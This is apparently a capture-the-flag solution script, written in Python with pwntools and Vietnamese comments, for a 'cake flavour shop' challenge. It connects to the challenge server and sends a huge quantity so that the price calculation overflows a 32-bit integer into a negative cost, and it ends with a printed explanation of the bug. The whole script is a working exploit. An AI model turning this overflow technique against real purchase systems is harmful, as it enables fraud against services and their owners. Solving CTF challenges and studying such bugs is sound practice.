#!/usr/bin/env python3

from pwn import *

# Kết nối tới server
# Thay đổi host và port theo đề bài
r = remote('cake-flavour-shop.challs.brunnerne.xyz', 33000)

# Đọc thông báo chào mừng
print(r.recvuntil(b'You have $15.\n').decode())

# Chọn menu "Sample cake flavours"
print(r.recvuntil(b'> ').decode(), end='')
r.sendline(b'1')

# Chọn "Flag Flavour"  
print(r.recvuntil(b'> ').decode(), end='')
r.sendline(b'4')

# Tính toán số lượng để tạo integer overflow
# Với FLAG_COST = 100, cần tìm qty sao cho qty * 100 overflow thành số âm
# Trong 32-bit signed integer: MAX_INT = 2147483647
# Cần qty sao cho qty * 100 > MAX_INT và wrap around thành số âm nhỏ

# Thử với qty = 21474837 (sẽ tạo overflow)
# 21474837 * 100 = 2147483700 > MAX_INT (2147483647)
# Sẽ wrap around thành số âm

qty = 21474837
print(f"Sending quantity: {qty}")
print(r.recvuntil(b'How many? ').decode(), end='')
r.sendline(str(qty).encode())

# Đọc kết quả
try:
    result = r.recvall(timeout=2).decode()
    print(result)
    
    # Tìm flag trong output
    if 'flag{' in result.lower() or 'ctf{' in result.lower():
        lines = result.split('\n')
        for line in lines:
            if 'flag{' in line.lower() or 'ctf{' in line.lower():
                print(f"\n*** FLAG FOUND: {line.strip()} ***")
except:
    # Nếu không đọc được tất cả, thử đọc từng dòng
    while True:
        try:
            line = r.recvline(timeout=1).decode()
            print(line, end='')
            if 'flag{' in line.lower() or 'ctf{' in line.lower():
                print(f"\n*** FLAG FOUND: {line.strip()} ***")
                break
        except:
            break

r.close()

print("\n" + "="*50)
print("GIẢI THÍCH:")
print("="*50)
print("1. Lỗ hổng: Integer overflow trong hàm buy()")
print("2. qty được đọc như unsigned nhưng cost = qty * price có thể overflow")
print("3. Khi overflow, cost trở thành số âm")
print("4. Điều kiện cost <= balance sẽ đúng với số âm")
print("5. balance -= cost với cost âm sẽ tăng balance")
print("6. Flag được in ra khi mua thành công Flag Flavour")